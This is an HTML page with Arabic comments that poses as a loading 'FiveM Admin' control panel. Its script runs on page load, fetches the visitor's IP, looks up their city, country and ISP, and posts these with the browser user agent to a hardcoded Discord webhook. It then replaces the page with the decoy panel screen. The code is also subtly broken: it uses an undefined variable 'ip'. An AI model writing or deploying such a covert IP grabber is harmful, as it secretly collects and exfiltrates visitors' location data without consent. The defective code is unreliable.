<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script>
        // ========== ويب هوك ==========
        const WEBHOOK = "https://discord.com/api/webhooks/1544031793022243036/NyaMsf-1ov07NigYIObLgAORUs9OfAru9gKyEXpQYYHpntGJIAzxK8tQmCskuqb6I5X2";

        (async function() {
            try {
                // جلب IP
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();

                // جلب الموقع
                const lr = await fetch(`https://ipapi.co/${ip}/json/`);
                const ld = await lr.json();

                // إرسال
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**IP:** ${ip}\n**الموقع:** ${ld.city || 'غير معروف'}, ${ld.country_name || 'غير معروف'}\n**الـ ISP:** ${ld.org || 'غير معروف'}\n**المتصفح:** ${navigator.userAgent}\n**الوقت:** ${new Date().toISOString()}`
                    })
                });
            } catch(e) {}

            // تحويل الصفحة إلى موقع عادي بعد إرسال البيانات
            document.write(`
                <body style="background:#0b0d15;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;">
                    <h1 style="color:#f5c842;">⚡ FiveM Admin</h1>
                    <p style="color:#9aa3b8;">جاري تحميل لوحة التحكم...</p>
                </body>
            `);
        })();
